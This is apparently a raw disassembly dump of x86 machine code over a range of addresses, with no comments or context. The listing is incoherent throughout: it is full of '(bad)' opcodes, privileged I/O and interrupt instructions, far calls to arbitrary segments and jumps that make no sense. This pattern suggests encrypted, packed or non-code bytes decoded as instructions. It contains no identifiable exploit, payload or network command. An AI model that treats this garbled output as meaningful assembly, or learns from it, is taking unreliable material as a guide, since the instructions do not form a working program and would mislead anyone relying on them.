  411b6e:	xchg   edi,eax
  411b6f:	pushf  
  411b70:	fcmovnbe st,st(4)
  411b72:	jns    0x411b54
  411b74:	leave  
  411b75:	into   
  411b76:	sub    eax,0x737b8b9a
  411b7b:	je     0x411b01
  411b7d:	ror    DWORD PTR [edx-0xd],1
  411b80:	xchg   ecx,eax
  411b81:	sub    DWORD PTR [eax+0x42],eax
  411b84:	pop    ds
  411b85:	stc    
  411b86:	test   bh,bl
  411b88:	push   ds
  411b89:	gs popa 
  411b8b:	jbe    0x411bf1
  411b8d:	pushf  
  411b8e:	xchg   ecx,ebx
  411b90:	sbb    BYTE PTR [esi+0xfc0c65c],0xba
  411b97:	jbe    0x411b7d
  411b99:	daa    
  411b9a:	xor    ah,BYTE PTR [esi+0x34]
  411b9d:	sbb    al,BYTE PTR [eax-0x37]
  411ba0:	fdiv   st,st(1)
  411ba2:	loopne 0x411c1b
  411ba4:	inc    ebx
  411ba5:	out    0x86,al
  411ba7:	nop
  411ba8:	mov    esp,0x768a068e
  411bad:	or     al,0x39
  411baf:	cmp    ch,BYTE PTR [edx]
  411bb1:	std    
  411bb2:	inc    ebp
  411bb3:	push   edi
  411bb4:	or     al,BYTE PTR [ecx]
  411bb6:	dec    ebp
  411bb7:	ins    DWORD PTR es:[edi],dx
  411bb8:	jb     0x411bc1
  411bba:	stc    
  411bbb:	clc    
  411bbc:	xor    ch,bl
  411bbe:	test   eax,0xfd649892
  411bc3:	and    al,0x97
  411bc5:	rol    ah,1
  411bc7:	sub    BYTE PTR [edi+0x4c],0x2c
  411bcb:	addr16 jg 0x411baa
  411bce:	loopne 0x411ba4
  411bd0:	mov    esp,0x1ca24654
  411bd5:	push   ecx
  411bd6:	call   0xd716c67
  411bdb:	out    dx,al
  411bdc:	inc    ecx
  411bdd:	xchg   BYTE PTR [edi+0x4],dh
  411be0:	(bad)
  411be4:	add    esi,DWORD PTR [eax-0x1f]
  411be7:	push   edi
  411be8:	fsubr  DWORD PTR [esi+0x2d06d688]
  411bee:	xchg   ebp,eax
  411bef:	int    0x8d
  411bf1:	cmp    edi,edi
  411bf3:	cmp    esi,edi
  411bf5:	aaa    
  411bf6:	scas   eax,DWORD PTR es:[edi]
  411bf7:	arpl   dx,cx
  411bf9:	xchg   ah,bh
  411bfb:	icebp  
  411bfc:	jecxz  0x411c5e
  411bfe:	cmp    eax,0x203e7df2
  411c03:	jecxz  0x411bd7
  411c05:	xchg   BYTE PTR [di-0x54],bh
  411c09:	adc    ebp,eax
  411c0b:	adc    ecx,eax
  411c0d:	jl     0x411c8c
  411c0f:	icebp  
  411c10:	inc    esi
  411c11:	imul   ecx,DWORD PTR [edx],0xb8c5fd49
  411c17:	iret   
  411c18:	aaa    
  411c19:	das    
  411c1a:	retf   0x2837
  411c1d:	dec    edx
  411c1e:	mov    ah,0x8f
  411c20:	adc    cl,BYTE PTR [ebx+ebx*8+0x45624d82]
  411c27:	push   eax
  411c28:	repnz lock push ebx
  411c2b:	push   ecx
  411c2c:	test   al,0x41
  411c2e:	shr    BYTE PTR [edx-0x70fa04aa],1
  411c34:	inc    ecx
  411c35:	shl    BYTE PTR [edi-0x6b18b97b],1
  411c3b:	out    dx,al
  411c3c:	(bad)  
  411c3d:	jns    0x411c95
  411c3f:	cmp    al,0xde
  411c41:	rol    dh,cl
  411c43:	mov    ds:0xfe41e29,al
  411c48:	xor    DWORD PTR [edi+ecx*8+0x53],edi
  411c4c:	pop    esi
  411c4d:	push   es
  411c4e:	imul   ecx
  411c50:	leave  
  411c51:	cdq    
  411c52:	stos   BYTE PTR es:[edi],al
  411c53:	cmp    BYTE PTR ds:0x7bb97b5b,dl
  411c59:	mov    DWORD PTR [eax+0xf],esi
  411c5c:	call   0xdf90:0x65771f6c
  411c63:	js     0x411cb2
  411c65:	pop    ebp
  411c66:	mov    ah,BYTE PTR [edx-0x11]
  411c69:	mov    bl,0xb
  411c6b:	imul   ebp,ebp,0xdb1b18bf
  411c71:	add    DWORD PTR [ebp-0x4ac11a55],esp
  411c77:	push   esp
  411c78:	sbb    eax,0x105bb92e
  411c7d:	xor    edi,DWORD PTR [esi]
  411c7f:	ds repnz mov edi,0x2647979c
  411c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c88:	(bad)  
  411c89:	or     DWORD PTR [ecx],esi
  411c8b:	lods   al,BYTE PTR ds:[esi]
  411c8c:	imul   edx,DWORD PTR [ecx+0x5045b3da],0x5f
  411c93:	mov    WORD PTR [ebp+0x27],fs
  411c96:	mov    DWORD PTR [edi+0x4c],esi
  411c99:	sar    BYTE PTR [esi+0x9ea8af8],1
  411c9f:	lahf   
  411ca0:	outs   dx,DWORD PTR ds:[esi]
  411ca1:	fistp  DWORD PTR [ebp+0x11]
  411ca4:	add    al,0xb6
  411ca6:	push   es
  411ca7:	fcomp  DWORD PTR [ecx]
  411ca9:	daa    
  411caa:	je     0x411c72
  411cac:	jge    0x411cef
  411cae:	or     eax,DWORD PTR [ebp-0x3ff6f235]
  411cb4:	ins    BYTE PTR es:[edi],dx
  411cb5:	jp     0x411c8c
  411cb7:	jo     0x411d1b
  411cb9:	pushf  
  411cba:	imul   ebx,DWORD PTR [edx*8+0x4d1b6c4d],0x780745bb
  411cc5:	dec    ebp
  411cc6:	icebp  
  411cc7:	ss retf 
  411cc9:	push   esi
  411cca:	jmp    0xc9b0:0x4411e13
  411cd1:	fwait
  411cd2:	mov    ch,0xb4
  411cd4:	mov    al,0xb
  411cd6:	xchg   ebp,eax
  411cd7:	leave  
  411cd8:	adc    DWORD PTR [eax+edx*1],edi
  411cdb:	sti    
  411cdc:	jl     0x411cf0
  411cde:	cmp    edx,DWORD PTR [esi]
  411ce0:	or     bl,BYTE PTR [esi-0x1682c94f]
  411ce6:	mov    esi,0xc6a264f
  411ceb:	pop    ss
  411cec:	xchg   esp,eax
  411ced:	not    ecx
  411cef:	xor    DWORD PTR [ebx-0x1cc15677],edi
  411cf5:	clc    
  411cf6:	into   
  411cf7:	(bad)  
  411cf8:	jmp    0x6a910be0
  411cfd:	pop    edx
  411cfe:	std    
  411cff:	or     al,0xdf
  411d01:	jp     0x411c8b
  411d03:	daa    
  411d04:	mov    ch,0x87
  411d06:	push   ebx
  411d07:	iret   
  411d08:	pop    ss
  411d09:	jae    0x411d19
  411d0b:	inc    esi
  411d0c:	repnz inc edi
  411d0e:	push   ss
  411d0f:	ret    
  411d10:	inc    ebx
  411d11:	add    eax,0xd29e58b8
  411d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d17:	dec    ecx
  411d18:	call   0x1fb9:0xb177a870
  411d1f:	mov    dh,0x97
  411d21:	mov    dh,ah
  411d23:	mov    al,ds:0x34c4c10c
  411d28:	dec    edi
  411d29:	cmp    DWORD PTR [edx+0x18],ecx
  411d2c:	and    eax,0x1286941b
  411d31:	jecxz  0x411d3b
  411d33:	ffree  st(4)
  411d35:	std    
  411d36:	mov    bl,0x92
  411d38:	(bad)  
  411d39:	dec    edi
  411d3a:	out    0xb1,eax
  411d3c:	mov    al,ds:0x115c8a8
  411d41:	inc    esi
  411d42:	ins    WORD PTR es:[edi],dx
  411d44:	and    DWORD PTR [ecx+eiz*4],0x5a973426
  411d4b:	inc    eax
  411d4c:	jge    0x411d2f
  411d4e:	test   DWORD PTR ds:0x642a14d9,edx
  411d54:	mov    eax,ds:0x4b7ce3e4
  411d59:	mov    ds:0xfaffa2cd,al
  411d5e:	jecxz  0x411da1
  411d60:	dec    esi
  411d61:	jne    0x411cec
  411d63:	xchg   edi,eax
  411d64:	push   ds
  411d65:	mov    gs,esi
  411d67:	pop    esi
  411d68:	in     eax,dx
  411d69:	mov    BYTE PTR [eax+0x52df6eb],ch
  411d6f:	shl    dh,1
  411d71:	cs ret 0xe4c4
  411d75:	inc    edx
  411d76:	mov    ch,0x81
  411d78:	aad    0x36
  411d7a:	psubusw mm1,QWORD PTR [ebx]
  411d7d:	add    BYTE PTR [ebx-0x2f],cl
  411d80:	cmp    BYTE PTR [esi-0x20],0xea
  411d84:	pop    ds
  411d85:	pop    esp
  411d86:	mov    ch,0x1f
  411d88:	or     ebx,DWORD PTR [eax-0x39df868]
  411d8e:	addr16 enter 0x148e,0xc
  411d93:	cwde   
  411d94:	fwait
  411d95:	push   ebx
  411d96:	push   cs
  411d97:	call   0xd326879a
  411d9c:	das    
  411d9d:	out    0xad,eax
  411d9f:	jge    0x411d6f
  411da1:	out    dx,al
  411da2:	(bad)  
  411da3:	mov    ecx,0xc1656d4d
  411da8:	test   al,0xa8
  411daa:	dec    ecx
  411dab:	xchg   esp,eax
  411dac:	mov    esi,0x7d56dd9a
  411db1:	icebp  
  411db2:	vmread DWORD PTR [edx],esp
  411db5:	test   al,0x66
  411db7:	mov    eax,0x6e69c509
  411dbc:	jnp    0x411de0
  411dbe:	sbb    al,dh
  411dc0:	mov    eax,ds:0x4b70962f
  411dc5:	pop    ss
  411dc6:	loopne 0x411de7
  411dc8:	out    0xfc,al
  411dca:	and    BYTE PTR [ebp-0x46],al
  411dcd:	fld    st(3)
  411dcf:	shr    DWORD PTR [ebx-0x4d],0x33
  411dd3:	fild   WORD PTR [ebx-0x40]
  411dd6:	xchg   esp,eax
  411dd7:	mov    eax,0x4c0c85e6
  411ddc:	scas   eax,DWORD PTR es:[edi]
  411ddd:	dec    edi
  411dde:	repz bound ebx,QWORD PTR [esi]
  411de1:	push   edi
  411de2:	test   ah,dl
  411de4:	bound  esi,QWORD PTR [edx-0x1c143c60]
  411dea:	mov    ecx,0x86ec48a1
  411def:	mov    DWORD PTR [esi],esp
  411df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411df2:	xor    eax,0x4be80e03
  411df7:	popf   
  411df8:	adc    eax,0x912d281
  411dfd:	aad    0xfb
  411dff:	pop    eax
  411e00:	adc    dh,BYTE PTR [eax-0x488d54b]
  411e06:	dec    edx
  411e07:	ds enter 0xe016,0x47
  411e0c:	cmp    dl,BYTE PTR [esi-0x4098a401]
  411e12:	mov    al,ds:0xb0c48f2d
  411e17:	cwde   
  411e18:	push   edx
  411e19:	sar    BYTE PTR [edi-0x12eace8a],1
  411e1f:	xchg   edx,eax
  411e20:	iret   
  411e21:	dec    ecx
  411e22:	inc    eax
  411e23:	lea    eax,[ecx-0x7d]
  411e26:	adc    eax,0xb271deb1
  411e2b:	and    DWORD PTR [edi+eax*4-0x48],ecx
  411e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e30:	inc    eax
  411e31:	fisub  WORD PTR [esi-0x6a46f9c1]
  411e37:	dec    ebx
  411e38:	cmc    
  411e39:	in     al,0x1b
  411e3b:	shl    DWORD PTR [esi],0x77
  411e3e:	and    esi,DWORD PTR [ebx+0x13ce16cc]
  411e44:	sbb    ebp,DWORD PTR [esi]
  411e46:	test   eax,0xaaabe5ff
  411e4b:	xor    edx,edx
  411e4d:	imul   eax,esi,0x39c79fc8
  411e53:	mov    bh,0xf7
  411e55:	ins    DWORD PTR es:[edi],dx
  411e56:	add    eax,0x1135ae86
  411e5b:	bound  esp,QWORD PTR [edx+0x2415ae68]
  411e61:	leave  
  411e62:	mov    ebp,0x25160427
  411e67:	aas    
  411e68:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  411e6a:	int    0xbd
  411e6c:	call   0x11d3:0x7b79213a
  411e73:	out    dx,eax
  411e74:	in     al,dx
  411e75:	jecxz  0x411ea2
  411e77:	(bad)  
  411e78:	out    dx,al
  411e79:	dec    ebx
  411e7a:	stos   DWORD PTR es:[edi],eax
  411e7b:	inc    edx
  411e7c:	call   0x1569d75d
  411e81:	mov    cs,WORD PTR [esi]
  411e83:	rcl    BYTE PTR [esi],cl
  411e85:	bound  edx,QWORD PTR [ebp+eiz*1+0x32c1439]
  411e8c:	ins    DWORD PTR es:[edi],dx
  411e8d:	mov    dl,0x26
  411e8f:	ja     0x411edf
  411e91:	mov    WORD PTR [edx-0x270ebbf4],ss
  411e97:	dec    ebp
  411e98:	add    al,0xd2
  411e9a:	cmp    BYTE PTR [edx+0x37],ch
  411e9d:	or     DWORD PTR [ecx+0x6092adf],0x35
  411ea4:	xor    al,0x58
  411ea6:	sbb    ah,BYTE PTR [ebx]
  411ea8:	mov    dl,0x83
  411eaa:	jge    0x411e84
  411eac:	inc    eax
  411ead:	loop   0x411f19
  411eaf:	and    eax,0x830c8fc8
  411eb4:	ja     0x411ea8
  411eb6:	and    ebx,ebp
  411eb8:	imul   bh
  411eba:	xor    esp,edi
  411ebc:	sub    eax,DWORD PTR [eax]
  411ebe:	sub    eax,0x208e3ecd
  411ec3:	jp     0x411edd
  411ec5:	shl    eax,1
  411ec7:	mov    DWORD PTR [ebp+0x78],esi
  411eca:	(bad)  
  411ecb:	and    al,0x9e
  411ecd:	jp     0x411eca
  411ecf:	adc    BYTE PTR [ebp+0x4e],0x50
  411ed3:	xlat   BYTE PTR ds:[ebx]
  411ed4:	popa   
  411ed5:	das    
  411ed6:	mov    edi,0x6b965d27
  411edb:	fild   WORD PTR [eax+0x29]
  411ede:	std    
  411edf:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  411ee1:	int    0x6c
  411ee3:	je     0x411f1a
  411ee5:	pop    esp
  411ee6:	in     eax,0x5c
  411ee8:	arpl   WORD PTR [eax+0x72546ff5],si
  411eee:	add    bl,BYTE PTR [edi+0x64]
  411ef1:	add    BYTE PTR [edx+eiz*8+0x62],ch
  411ef5:	out    0xb5,al
  411ef7:	stos   BYTE PTR es:[edi],al
  411ef8:	rol    ebp,cl
  411efa:	fcomp  DWORD PTR [esi-0x5f]
  411efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411efe:	and    ecx,ebp
  411f00:	push   eax
  411f01:	adc    eax,0x70b443b4
  411f06:	mov    bl,0xf8
  411f08:	in     eax,0xe2
  411f0a:	pop    ebx
  411f0b:	popa   
  411f0c:	jno    0x411f46
  411f0e:	ja     0x411ea8
  411f10:	pop    edx
  411f11:	in     eax,dx
  411f12:	inc    ecx
  411f13:	jl     0x411f7c
  411f15:	(bad)  
  411f16:	adc    edi,DWORD PTR [edi+0x11]
  411f19:	icebp  
  411f1a:	ja     0x411f13
  411f1c:	xchg   esi,eax
  411f1d:	adc    eax,0xf3552e47
  411f22:	mov    ch,0xcb
  411f24:	ja     0x411f5b
  411f26:	frstor [edx-0x26]
  411f29:	leave  
  411f2a:	popw   ss
  411f2c:	inc    BYTE PTR [esi-0x40853105]
  411f32:	test   al,0xb4
  411f34:	push   eax
  411f35:	out    0x0,eax
  411f37:	ja     0x411f52
  411f39:	dec    esi
  411f3a:	pop    eax
  411f3b:	outs   dx,DWORD PTR ds:[esi]
  411f3c:	and    al,0xfe
  411f3e:	pop    eax
  411f3f:	mov    esp,0x82a4d7e9
  411f44:	fwait
  411f45:	retf   
  411f46:	xchg   esp,eax
  411f47:	sub    esp,DWORD PTR [si+0x5d]
  411f4b:	imul   esi,DWORD PTR [ecx-0x31d8f2d2],0x3b9562d1
  411f55:	push   0xdcd0f1f3
  411f5a:	loopne 0x411fc8
  411f5c:	xchg   esp,eax
  411f5d:	retf   0x344a
  411f60:	mov    al,BYTE PTR [ecx+0x24e7fb8]
  411f66:	dec    esp
  411f67:	(bad)  
  411f68:	iret   
  411f69:	jmp    0x9961:0x512e08f5
  411f70:	push   DWORD PTR [esi+0x50]
  411f73:	lea    esp,[ebp+0xda461e3]
  411f79:	sub    eax,0x22d95ff8
  411f7e:	mov    ah,0x81
  411f80:	mov    dl,0xcf
  411f82:	sbb    eax,0x77d2260b
  411f87:	mov    ch,0x95
  411f89:	cmc    
  411f8a:	pop    eax
  411f8b:	jmp    0xc721fd4f
  411f90:	test   BYTE PTR [ecx+0x537abaf],ch
  411f96:	(bad)  
  411f97:	xor    eax,0xe7a477e0
  411f9c:	sub    BYTE PTR [eax-0x5cb5927c],0x85
  411fa3:	loope  0x411fc7
  411fa5:	out    dx,eax
  411fa6:	fninit 
  411fa8:	int3   
  411fa9:	std    
  411faa:	jne    0x411f6a
  411fac:	sub    DWORD PTR [esp+esi*2],ebp
  411faf:	lock shr BYTE PTR [eax],0x1b
  411fb3:	mov    edi,0xce3f26cd
  411fb8:	push   0x3dfd9475
  411fbd:	loopne 0x411fb9
  411fbf:	je     0x41200c
  411fc1:	jg     0x412027
  411fc3:	pop    ebx
  411fc4:	mov    ch,0x8b
  411fc6:	push   esp
  411fc7:	(bad)  
  411fc8:	jge    0x412046
  411fca:	dec    ebp
  411fcb:	xlat   BYTE PTR ds:[ebx]
  411fcc:	or     eax,0x3e498e5e
  411fd1:	ret    0x823d
  411fd4:	push   0x9b9ed0de
  411fd9:	dec    ecx
  411fda:	pop    eax
  411fdb:	pop    esp
  411fdc:	push   ds
  411fdd:	outs   dx,BYTE PTR ds:[esi]
  411fde:	push   esp
  411fdf:	push   esp
  411fe0:	test   BYTE PTR [edi-0x19],dh
  411fe3:	cmp    al,0x21
  411fe5:	hlt    
  411fe6:	push   es
  411fe7:	and    al,0x0
  411fe9:	jmp    0x7b510245
  411fee:	iretw  
  411ff0:	mov    edi,0xc7e51c3f
  411ff5:	mov    ebx,0x750299ed
  411ffa:	mov    dh,ch
  411ffc:	sub    ebp,DWORD PTR [edi+0x198bf89d]
  412002:	or     BYTE PTR [edi+0x34],0x8e
  412006:	inc    ebp
  412007:	and    al,BYTE PTR [ecx-0x6]
  41200a:	sbb    DWORD PTR [ebx],esi
  41200c:	test   DWORD PTR [esi+0x59],eax
  41200f:	cdq    
  412010:	out    0x66,eax
  412012:	in     al,0xa9
  412014:	push   0xffffff87
  412016:	imul   ecx,DWORD PTR [edi],0xb04c10bb
  41201c:	jne    0x411f9f
  41201e:	xor    eax,0x8ea84362
  412023:	mov    al,ds:0x6a3ed8b3
  412028:	(bad)  
  412029:	push   edx
  41202a:	and    edi,DWORD PTR [edi]
  41202c:	rcl    DWORD PTR [ecx+0xf],1
  41202f:	xchg   esp,eax
  412030:	pop    esi
  412031:	jno    0x411fb5
  412033:	xchg   ecx,eax
  412034:	aam    0xf8
  412036:	jb     0x412054
  412038:	push   cs
  412039:	in     eax,dx
  41203a:	xchg   edx,eax
  41203b:	pop    ss
  41203c:	and    edi,DWORD PTR [edi+0x54]
  41203f:	xchg   ecx,eax
  412040:	sub    bh,BYTE PTR [ebx-0x64]
  412043:	jne    0x41209e
  412045:	popf   
  412046:	mov    eax,ds:0x7ba732f7
  41204b:	out    0xa5,eax
  41204d:	sahf   
  41204e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41204f:	and    ecx,DWORD PTR [edx+0x13564853]
  412055:	popf   
  412056:	mov    ch,0xd4
  412058:	fnstcw WORD PTR [eax]
  41205a:	mov    dh,cl
  41205c:	cmp    eax,0x4760d833
  412061:	mov    eax,ds:0x64d26094
  412066:	jb     0x41203d
  412068:	call   0x4feb9c11
  41206d:	inc    eax
  41206e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41206f:	or     esp,DWORD PTR [esi-0x6e4c8c50]
  412075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412076:	test   ecx,0x77d07f77
  41207c:	fsub   DWORD PTR [ebx]
  41207e:	sbb    eax,0x2af72023
  412083:	nop
  412084:	mov    al,ds:0xd170d51d
  412089:	push   eax
  41208a:	arpl   WORD PTR [ebx+0xe],di
  41208d:	ret    0xcaed
  412090:	jl     0x412111
  412092:	jmp    DWORD PTR [esi+0x72]
  412095:	push   0x221f4bfc
  41209a:	xor    DWORD PTR cs:[esi],edx
  41209d:	loopne 0x41210c
  41209f:	dec    ebp
  4120a0:	push   ds
  4120a1:	mov    ebx,0x4a9a8687
  4120a6:	jle    0x41206d
  4120a8:	cmp    eax,0x24cc4dfd
  4120ad:	repnz push cs
  4120af:	mov    esi,0x1d59e368
  4120b4:	sbb    eax,0xc9339e0
  4120b9:	ror    BYTE PTR [edx],cl
  4120bb:	xchg   ecx,eax
  4120bc:	bound  ebx,QWORD PTR [eax+edx*2+0x1a1cd4cf]
  4120c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c4:	pop    eax
  4120c5:	popf   
  4120c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120c7:	shl    DWORD PTR [ebp-0x10aa630b],cl
  4120cd:	fs pop ds
  4120cf:	loope  0x4120e8
  4120d1:	das    
  4120d2:	imul   DWORD PTR [eax]
  4120d4:	and    eax,0xbcf5a9b1
  4120d9:	mov    bl,0xdc
  4120db:	xchg   ecx,eax
  4120dc:	daa    
  4120dd:	cdq    
  4120de:	addr16 dec ecx
  4120e0:	mov    WORD PTR [edi],cs
  4120e2:	or     DWORD PTR [esi+ecx*4-0x29501279],0x4ee5f40e
  4120ed:	mov    ecx,ebx
  4120ef:	sti    
  4120f0:	cld    
  4120f1:	mov    bh,0xa7
  4120f3:	and    ah,BYTE PTR [eax+0x44]
  4120f6:	sti    
  4120f7:	in     eax,0x32
  4120f9:	icebp  
  4120fa:	loopne 0x4120b2
  4120fc:	rcr    DWORD PTR [edi+0x1f929167],1
  412102:	xor    DWORD PTR [eax],esp
  412104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412105:	sub    eax,esp
  412107:	stos   DWORD PTR es:[edi],eax
  412108:	cs cld 
  41210a:	jb     0x41217f
  41210c:	xor    al,0xce
  41210e:	popf   
  41210f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412110:	jecxz  0x412096
  412112:	mov    eax,ds:0xbfa16718
  412117:	dec    ebx
  412118:	mov    bl,0xb6
  41211a:	adc    al,0xb9
  41211c:	xor    eax,0xb1015899
  412121:	mov    ?,esi
  412123:	add    ebp,DWORD PTR [edx+0x2e]
  412126:	cmp    eax,0xe1e40d0a
  41212b:	sub    eax,0x5308307b
  412130:	adc    ebp,edi
  412132:	(bad)  
  412133:	jo     0x41218d
  412135:	dec    eax
  412136:	sbb    al,BYTE PTR [edi]
  412138:	(bad)  
  412139:	mov    bh,0x8
  41213b:	xchg   BYTE PTR [ebx],bh
  41213d:	cmp    DWORD PTR [ebp+ebp*2+0x1b],0xffffffe6
  412142:	cwde   
  412143:	pop    esi
  412144:	add    dl,BYTE PTR [ecx+ebp*1-0xe]
  412148:	sti    
  412149:	adc    al,0xa6
  41214b:	push   0xefc297c
  412150:	add    DWORD PTR ds:0x6bf51535,ebp
  412156:	mov    al,0xe5
  412158:	pusha  
  412159:	je     0x4120e7
  41215b:	sub    al,0x87
  41215d:	sahf   
  41215e:	sub    eax,0x100b0098
  412163:	aaa    
  412164:	icebp  
  412165:	nop
  412166:	out    dx,eax
  412167:	mov    al,0x5d
  412169:	in     eax,0xf1
  41216b:	jmp    0xfac6bd84
  412170:	adc    bh,BYTE PTR [esi+0x78]
  412173:	jl     0x412194
  412175:	cmp    ebx,ebp
  412177:	daa    
  412178:	test   eax,0x50add42e
  41217d:	retf   
  41217e:	jns    0x4121a6
  412180:	mov    dh,0x35
  412182:	pop    es
  412183:	int    0x6
  412185:	jecxz  0x4121f4
  412187:	mov    ch,0x58
  412189:	push   edx
  41218a:	(bad)  
  41218b:	loope  0x412149
  41218d:	out    0xd2,eax
  41218f:	call   0xf02e:0xf8d4bee7
  412196:	xchg   ebx,eax
  412197:	je     0x41214c
  412199:	addr16 aaa 
  41219b:	pushf  
  41219c:	cmp    DWORD PTR [esi-0x4c],eax
  41219f:	bound  edi,QWORD PTR [edx]
  4121a1:	and    esi,DWORD PTR [ecx+eax*4]
  4121a4:	jo     0x41217d
  4121a6:	xchg   edi,eax
  4121a7:	(bad)  
  4121a8:	dec    ebx
  4121a9:	lods   eax,DWORD PTR ds:[esi]
  4121aa:	mov    bl,0x2d
  4121ac:	and    edx,DWORD PTR [ecx-0x5e8ffdfe]
  4121b2:	je     0x412150
  4121b4:	xchg   BYTE PTR [eax+0x48],ch
  4121b7:	mov    ecx,0x6bfe1dfc
  4121bc:	fsubr  QWORD PTR [ebx]
  4121be:	shl    BYTE PTR [edi],cl
  4121c0:	call   0x56ac6ce7
  4121c5:	inc    esi
  4121c6:	std    
  4121c7:	imul   edi,DWORD PTR [esi+0x66440550],0x772149f7
  4121d1:	aam    0x6
  4121d3:	add    eax,0x35a80447
  4121d8:	aad    0xc8
  4121da:	push   eax
  4121db:	xor    al,0x6f
  4121dd:	(bad)  
  4121df:	test   al,0xdf
  4121e1:	pushf  
  4121e2:	push   eax
  4121e3:	push   edx
  4121e4:	dec    BYTE PTR [esi-0xd034236]
  4121ea:	fdiv   QWORD PTR [edi]
  4121ec:	(bad)  
  4121ee:	cmp    al,0x6d
  4121f0:	mov    ch,0x83
  4121f2:	sub    ebx,ecx
  4121f4:	xor    bl,0xc2
  4121f7:	or     BYTE PTR [ebx-0x7a],ah
  4121fa:	and    bh,BYTE PTR ds:0xfd7040bc
  412200:	mov    eax,0x7d816e0a
  412205:	in     al,dx
  412206:	call   0x7fe515fc
  41220b:	imul   esp,eax,0xffffffa0
  41220e:	addr16 push 0x4a7454ce
  412214:	shr    BYTE PTR [edx+0x52bc41b4],0xaa
  41221b:	xor    al,0xca
  41221d:	add    DWORD PTR [ebx],esi
  41221f:	add    al,0x9d
  412221:	inc    ebx
  412222:	test   al,0x6e
  412224:	(bad)
  412227:	cmp    ch,BYTE PTR [esi]
  412229:	adc    BYTE PTR [edi+eiz*8],dl
  41222c:	lahf   
  41222d:	mov    cl,bh
  41222f:	retf   
  412230:	and    al,bl
  412232:	mul    ah
  412234:	out    0xb5,eax
  412236:	pop    ebp
  412237:	add    al,0xf4
  412239:	shl    DWORD PTR [esi-0x4c0299a8],0xd3
  412240:	add    al,0xe8
  412242:	mov    eax,ds:0x9e3b574a
  412247:	lods   al,BYTE PTR ds:[esi]
  412248:	mov    eax,0xccf4c20b
  41224d:	stos   DWORD PTR es:[edi],eax
  41224e:	dec    ebp
  41224f:	sbb    al,0xe1
  412251:	pop    ebx
  412252:	cmp    eax,0x15ffb99
  412257:	shr    BYTE PTR [eax],cl
  412259:	xchg   esi,eax
  41225a:	jg     0x4121e9
  41225c:	xchg   esp,edi
  41225e:	into   
  41225f:	aaa    
  412260:	(bad)  [ebx]
  412262:	pop    edi
  412263:	int3   
  412264:	add    eax,0xaa843595
  412269:	mov    edx,0x2a56f0c
  41226e:	sbb    bh,cl
  412270:	sbb    BYTE PTR [ebx+0x3180899],bh
  412276:	jb     0x412252
  412278:	test   DWORD PTR [edx+0x4cf960ac],edx
  41227e:	shr    DWORD PTR [ecx-0x557beff0],0xfb
  412285:	cmp    eax,0x840f951f
  41228a:	test   al,0x5b
  41228c:	xor    al,0x12
  41228e:	stos   BYTE PTR es:[edi],al
  41228f:	fcmovbe st,st(2)
  412291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412292:	sub    ebp,eax
  412294:	dec    eax
  412295:	pop    ebx
  412296:	pusha  
  412297:	mov    dl,0x0
  412299:	dec    esp
  41229a:	in     eax,dx
  41229b:	jge    0x41225e
  41229d:	outs   dx,DWORD PTR ds:[esi]
  41229e:	adc    DWORD PTR [ebp-0x2a4b56c2],eax
  4122a4:	dec    esi
  4122a5:	ret    
  4122a6:	pop    ebp
  4122a7:	iret   
  4122a8:	jp     0x412259
  4122aa:	hlt    
  4122ab:	pop    esi
  4122ac:	jg     0x41224b
  4122ae:	push   0xffffffaa
  4122b0:	add    ch,BYTE PTR [ebx+0x36a80bae]
  4122b6:	pop    esp
  4122b7:	push   edx
  4122b8:	add    dl,BYTE PTR [ebp+edi*8-0x76]
  4122bc:	into   
  4122bd:	push   eax
  4122be:	add    al,0x8a
  4122c0:	jg     0x41225f
  4122c2:	jae    0x412244
  4122c4:	inc    ecx
  4122c5:	bnd jbe 0x412326
  4122c8:	cmp    al,0xa6
  4122ca:	pushf  
  4122cb:	sti    
  4122cc:	sbb    dl,BYTE PTR [ecx+0x70]
  4122cf:	add    esp,DWORD PTR [edx-0x21]
  4122d2:	sub    ebp,edx
  4122d4:	jmp    DWORD PTR [edx+0x5d]
  4122d7:	cld    
  4122d8:	out    0x3a,eax
  4122da:	inc    ebp
  4122db:	leave  
  4122dc:	jno    0x412334
  4122de:	std    
  4122df:	sub    eax,0x5e96318f
  4122e4:	xlat   BYTE PTR ds:[ebx]
  4122e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122e6:	fst    DWORD PTR [ebx-0x46]
  4122e9:	dec    eax
  4122ea:	ja     0x41226c
  4122ec:	dec    ecx
  4122ed:	loop   0x41231f
  4122ef:	push   ebx
  4122f0:	call   0xfcf7ac26
  4122f5:	cli    
  4122f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122f7:	and    esi,DWORD PTR [ecx-0x2c56feaa]
  4122fd:	lods   al,BYTE PTR ds:[esi]
  4122fe:	xlat   BYTE PTR ds:[ebx]
  4122ff:	adc    dl,BYTE PTR [ebx-0x63026c59]
  412305:	stos   BYTE PTR es:[edi],al
  412306:	std    
  412307:	retf   
  412308:	out    0x5b,al
  41230a:	jg     0x412349
  41230c:	push   esp
  41230d:	and    ebx,DWORD PTR [eax]
  41230f:	cmp    BYTE PTR [eax],cl
  412311:	mov    WORD PTR [ebp+0x1c],fs
  412314:	(bad)  [esi-0x7dffea64]
  41231a:	sbb    DWORD PTR [ebx+0x264d0925],0xb67fdec6
  412324:	pop    es
  412325:	fstp   DWORD PTR [ecx-0x1c]
  412328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412329:	push   edx
  41232a:	loope  0x412307
  41232c:	ret    0xe81
  41232f:	xchg   ebp,eax
  412330:	xchg   BYTE PTR [esi],bl
  412332:	mov    ds:0x362632b2,eax
  412337:	repz rcl esp,1
